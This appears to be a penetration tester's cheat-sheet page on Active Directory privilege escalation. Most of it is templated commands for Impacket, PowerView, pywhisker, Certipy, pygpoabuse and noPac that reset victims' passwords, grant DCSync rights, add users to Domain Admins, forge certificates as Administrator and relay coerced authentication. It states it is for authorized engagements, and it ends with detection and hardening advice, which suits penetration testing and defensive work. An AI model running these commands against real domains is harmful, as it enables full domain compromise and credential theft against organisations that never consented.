# Active Directory — Privilege Escalation

Getting from a **low-privileged domain user to higher domain rights** — ultimately an account with `Replicating Directory Changes` (DCSync) or Domain Admin. This is *domain* privilege escalation; escalating **locally** on a single Windows host (SYSTEM) is in [Windows → Privilege Escalation](../Windows/Privilege%20Escalation.md). Enumerate first with [Enumeration](Enumeration.md) and BloodHound — every path below comes from something you can see in the graph. See [AD Attacks Overview](AD%20Attacks%20Overview.md); the full chain to the DC is [Attacking the Domain Controller](Attacking%20the%20Domain%20Controller.md).

> **Authorized engagements only.** Pick the shortest BloodHound path; prove impact minimally and report the rest.

## Where escalation comes from (pick from BloodHound)

| Vector | You need | Gets you |
| --- | --- | --- |
| Kerberoast / AS-REP | any domain user | a crackable service/user password |
| ACL abuse | `GenericAll`/`WriteDACL`/… on a target | takeover of that user/group/computer |
| Shadow Credentials | `GenericWrite`/`GenericAll` on a target | a TGT as that target (no password reset) |
| Group abuse | membership in a privileged built-in | direct rights (backup, DC DLL load, GPO) |
| GPO abuse | write on a GPO | SYSTEM on every linked host |
| Delegation (S4U/RBCD) | control of a delegating/computer object | impersonate any user to a service |
| AD CS (ESC1–ESC8) | a vulnerable cert template/endpoint | auth as any user / DA |
| Coercion + NTLM relay | a coercible host | rights on the relay target (RBCD/DCSync) |
| noPac (42278/42287) | `MachineAccountQuota > 0` | SYSTEM on the DC |

## Kerberos-based (crack or impersonate)

Kerberoasting and AS-REP roasting turn a normal account into a crackable hash; delegation lets you impersonate without a password. Full detail + hashcat modes in [Kerberos Attacks](Kerberos%20Attacks.md) and [Attacking the Domain Controller](Attacking%20the%20Domain%20Controller.md).

```bash
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc> -request -outputfile kerb.hashes  # kerberoast
getST.py -spn cifs/<target> -impersonate Administrator <domain>/<svc>:<pass>         # constrained delegation S4U
```

## ACL abuse (BloodHound edges)

An edge like `GenericAll`, `GenericWrite`, `WriteDACL`, `WriteOwner`, `ForceChangePassword`, or `AddMember` on a principal means you can take it over.

```bash
# ForceChangePassword: reset a user you have rights over
net rpc password "victim" "New@Pass1" -U "<domain>/<user>%<pass>" -S <dc>
changepasswd.py <domain>/victim@<dc> -newpass 'New@Pass1' -reset

# WriteDACL on the domain head -> grant yourself DCSync rights
dacledit.py -action write -rights DCSync -principal <user> -target-dn 'DC=corp,DC=local' <domain>/<user>:<pass>

# AddMember: add yourself to a privileged group
net rpc group addmem "Domain Admins" "<user>" -U "<domain>/<user>%<pass>" -S <dc>
```

```powershell
# PowerView equivalents from a Windows foothold
Add-DomainObjectAcl -TargetIdentity <victim> -PrincipalIdentity <user> -Rights All
Set-DomainUserPassword -Identity <victim> -AccountPassword (ConvertTo-SecureString 'New@Pass1' -AsPlainText -Force)
Add-DomainGroupMember -Identity 'Domain Admins' -Members <user>
```

## Shadow Credentials (`msDS-KeyCredentialLink`)

With `GenericWrite`/`GenericAll` over a user or computer, add a key credential and authenticate via PKINIT — **no password reset**, so it's quiet and reversible.

```bash
pywhisker -d <domain> -u <user> -p <pass> --target <victim> --action add    # adds the key + gives a .pfx
gettgtpkinit.py -cert-pfx <victim>.pfx -pfx-pass <pw> <domain>/<victim> victim.ccache
export KRB5CCNAME=victim.ccache                                             # now act as <victim>
```

```powershell
Whisker.exe add /target:<victim>      # Windows equivalent, then Rubeus asktgt /getcredentials
```

## Privileged group abuse

Built-in groups grant rights that skip straight to compromise:

- **Backup Operators / `SeBackupPrivilege`** — read any file: dump SAM/SYSTEM or `NTDS.dit` from a DC.
- **DnsAdmins** — load an arbitrary DLL into the DNS service (runs on the DC as SYSTEM) via `dnscmd /config /serverlevelplugindll`.
- **Account Operators** — manage most non-protected accounts/groups → pivot to a better group.
- **Server Operators** — control services on DCs → reconfigure a service binPath to run as SYSTEM.
- **GPO edit rights** — see below.

## GPO abuse

A GPO you can write to executes on **every host/user it's linked to** — often as SYSTEM.

```bash
pygpoabuse.py <domain>/<user>:<pass> -gpo-id <GUID> -command 'net localgroup administrators <user> /add'
```

```powershell
New-GPOImmediateTask -TaskName x -GPODisplayName "<vuln GPO>" -Command cmd.exe -CommandArguments "/c net user ..."   # SharpGPOAbuse equivalent
```

## Delegation abuse

- **Unconstrained:** coerce a DC/privileged host to authenticate to your controlled host, capture its TGT, reuse it.
- **Constrained (`msDS-AllowedToDelegateTo`):** `getST.py -impersonate` to reach the allowed SPN as any user.
- **Resource-Based (RBCD):** if you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a target, add a computer you control and S4U to it.

```bash
addcomputer.py <domain>/<user>:<pass> -computer-name 'EVIL$' -computer-pass 'P@ss'
rbcd.py -delegate-from 'EVIL$' -delegate-to '<victim>$' -action write <domain>/<user>:<pass>
getST.py -spn cifs/<victim> -impersonate Administrator <domain>/EVIL\$:'P@ss'
```

## AD Certificate Services (ESC1–ESC8)

Misconfigured certificate templates/endpoints let a normal user enroll a cert **as anyone**. Enumerate and exploit with **Certipy**.

```bash
certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -vulnerable -stdout    # list ESC1..ESC8

# ESC1: template allows an arbitrary SAN -> request a cert as Administrator
certipy req -u <user>@<domain> -p <pass> -ca <CA> -template <vuln-template> -upn administrator@<domain>
certipy auth -pfx administrator.pfx -dc-ip <dc>                              # -> TGT + NT hash
```

ESC8 = relay NTLM to the web enrollment endpoint — pair with coercion below.

## Coercion + NTLM relay, and noPac

- **Coercion** (`PetitPotam`, `PrinterBug`/`dementor`, `Coercer`) forces a host (often the DC) to authenticate to you; relay it (LDAP → RBCD/shadow creds, or AD CS ESC8). See [Impacket → NTLM relay](Impacket%20Toolkit.md#d-ntlm-relay-escalate-without-cracking).
- **noPac (CVE-2021-42278/42287)** — with `MachineAccountQuota > 0`, `sam-the-admin`/`noPac.py` yields a SYSTEM shell / DC ticket.

## After escalation

Once you hold replication rights (or DA), proceed to [DCSync / NTDS dump / golden ticket](Attacking%20the%20Domain%20Controller.md#step-4--domain-compromise-dcsync-ntds-dump-hashcat-persistence). Reuse of any recovered hash/ticket for movement is in [Lateral Movement & Credential Access](Lateral%20Movement%20%26%20Credential%20Access.md).

## Defense / detection (for the report)

- **ACL / group / GPO edits:** directory object modification (**5136**) on high-value objects and group changes (**4728/4732/4756**); review delegated rights and GPO permissions; tier admins.
- **Shadow Credentials:** monitor `msDS-KeyCredentialLink` writes; PKINIT logons (**4768** with certificate info) for accounts that don't normally use certs.
- **Kerberoast / AS-REP / delegation:** **4769** RC4 spikes, **4768** no-preauth; gMSA + AES; avoid unconstrained delegation; Protected Users.
- **AD CS:** audit template ACLs and `msPKI` flags; remove `ENROLLEE_SUPPLIES_SUBJECT`; enforce manager approval; patch/harden web enrollment (EPA/HTTPS).
- **Coercion / noPac:** set `ms-DS-MachineAccountQuota` to 0, patch, enforce SMB signing + LDAP channel binding, disable NTLM where possible.

## References

- [Enumeration](Enumeration.md), [Kerberos Attacks](Kerberos%20Attacks.md), [Lateral Movement & Credential Access](Lateral%20Movement%20%26%20Credential%20Access.md), [Impacket Toolkit](Impacket%20Toolkit.md), [Attacking the Domain Controller](Attacking%20the%20Domain%20Controller.md).
- BloodHound edge docs, The Hacker Recipes, Certipy wiki, HackTricks AD methodology.
